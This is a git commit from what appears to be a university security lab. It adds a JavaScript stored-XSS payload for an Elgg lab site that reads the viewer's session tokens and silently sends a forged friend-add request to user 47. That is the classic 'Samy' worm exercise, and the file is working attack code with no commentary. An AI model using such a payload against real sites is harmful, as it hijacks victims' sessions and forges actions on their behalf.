7ddbdd8b64672f2a8b4cb07b3511d0d521b0e6af
Mahathir <mirmahathir1@gmail.com>
2021-06-24 12:39:26 +0600

    xss: task 2 testing

---
+++ level4term1/Security/xss/1605011_/1605011_Task_2.js
@@ -0,0 +1,21 @@
+window.onload = function () {
+    var name = elgg.session.user.name;
+    var guid = "&guid="+elgg.session.user.guid;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+    var briefDesc = "&briefdescription=1605011"+"&accesslevel[briefdescription]=2";
+    
+    var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;
+    var content = name + guid + ts + token + briefDesc;
+    
+    var samyGuid = 47;
+
+    if (elgg.session.user.guid != samyGuid) {
+        var Ajax = null;
+        Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send();
+    }
+}
